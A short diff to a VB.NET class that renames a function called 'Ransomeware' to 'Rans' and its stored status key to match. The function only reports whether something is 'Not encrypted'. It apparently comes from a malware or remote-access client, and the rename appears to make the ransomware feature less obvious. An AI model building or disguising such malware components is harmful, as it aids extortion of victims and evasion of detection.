@@ -111,13 +111,13 @@ Public Class C_ID
         End Try
     End Function
 
-    Public Shared Function Ransomeware()
+    Public Shared Function Rans()
         Try
-            If GTV("Ransome-Status") = Nothing Then
-                STV("Ransome-Status", "Not encrypted")
+            If GTV("Rans-Status") = Nothing Then
+                STV("Rans-Status", "Not encrypted")
                 Return "Not encrypted"
             Else
-                Return GTV("Ransome-Status")
+                Return GTV("Rans-Status")
             End If
         Catch ex As Exception
             Return "Error"
